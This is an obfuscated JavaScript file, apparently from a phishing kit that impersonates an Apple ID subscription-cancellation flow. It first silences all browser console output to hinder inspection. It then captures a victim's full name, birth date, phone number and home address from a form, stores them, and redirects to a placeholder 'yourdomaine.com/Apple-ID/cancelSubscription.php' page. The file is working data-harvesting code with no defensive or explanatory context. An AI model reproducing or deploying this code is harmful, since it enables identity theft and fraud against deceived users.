var _0x550c10 = function() {
    var _0x4b81bb = !![];
    return function(_0x4d74cb, _0x32719f) {
        var _0x2dc776 = _0x4b81bb ? function() {
            if (_0x32719f) {
                var _0x362d54 = _0x32719f['apply'](_0x4d74cb, arguments);
                _0x32719f = null;
                return _0x362d54;
            }
        } : function() {};
        _0x4b81bb = ![];
        return _0x2dc776;
    };
}();
var _0x1a026c = _0x550c10(this, function() {
    var _0xb171e4 = function() {};
    var _0x1c5f5c = function() {
        var _0x4926bb;
        try {
            _0x4926bb = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');')();
        } catch (_0x4d9c90) {
            _0x4926bb = window;
        }
        return _0x4926bb;
    };
    var _0x2747a3 = _0x1c5f5c();
    if (!_0x2747a3['console']) {
        _0x2747a3['console'] = function(_0xb171e4) {
            var _0x406b01 = {};
            _0x406b01['log'] = _0xb171e4;
            _0x406b01['warn'] = _0xb171e4;
            _0x406b01['debug'] = _0xb171e4;
            _0x406b01['info'] = _0xb171e4;
            _0x406b01['error'] = _0xb171e4;
            _0x406b01['exception'] = _0xb171e4;
            _0x406b01['trace'] = _0xb171e4;
            return _0x406b01;
        }(_0xb171e4);
    } else {
        _0x2747a3['console']['log'] = _0xb171e4;
        _0x2747a3['console']['warn'] = _0xb171e4;
        _0x2747a3['console']['debug'] = _0xb171e4;
        _0x2747a3['console']['info'] = _0xb171e4;
        _0x2747a3['console']['error'] = _0xb171e4;
        _0x2747a3['console']['exception'] = _0xb171e4;
        _0x2747a3['console']['trace'] = _0xb171e4;
    }
});
_0x1a026c();
const form_2 = document['querySelector']('.datos2');
form_2['addEventListener']('submit', function(_0x540799) {
    _0x540799['preventDefault']();
    let _0x17d45f = document['getElementsByName']('firstName');
    let _0x377041 = document['getElementsByName']('middleName');
    let _0x1de09b = document['getElementsByName']('lastName');
    let _0x541707 = document['getElementsByName']('birthDay');
    let _0x5c11d0 = document['getElementsByName']('tel');
    let _0x420c42 = document['getElementsByName']('address1');
    let _0x381fd3 = document['getElementsByName']('address2');
    let _0x452b12 = document['getElementsByName']('city');
    let _0x3eea04 = document['getElementsByName']('zipCode');
    let _0x2fd095 = document['getElementsByName']('country');
    let _0x32dade = document['querySelector']('.next');
    if (_0x17d45f[0x0]['value'] && _0x1de09b[0x0]['value'] && _0x541707[0x0]['value'] && _0x5c11d0[0x0]['value'] && _0x420c42[0x0]['value'] && _0x452b12[0x0]['value'] && _0x3eea04[0x0]['value'] && _0x2fd095[0x0]['value']) {
        sessionStorage['setItem']('firstname', _0x17d45f[0x0]['value']);
        sessionStorage['setItem']('middlename', _0x377041[0x0]['value']);
        sessionStorage['setItem']('lastname', _0x1de09b[0x0]['value']);
        sessionStorage['setItem']('birthday', _0x541707[0x0]['value']);
        sessionStorage['setItem']('tel', _0x5c11d0[0x0]['value']);
        sessionStorage['setItem']('address1', _0x420c42[0x0]['value']);
        sessionStorage['setItem']('address2', _0x381fd3[0x0]['value']);
        sessionStorage['setItem']('city', _0x452b12[0x0]['value']);
        sessionStorage['setItem']('zipcode', _0x3eea04[0x0]['value']);
        sessionStorage['setItem']('country', _0x2fd095[0x0]['value']);
        window['location']['assign']('https://yourdomaine.com/Apple-ID/cancelSubscription.php');
    }
});
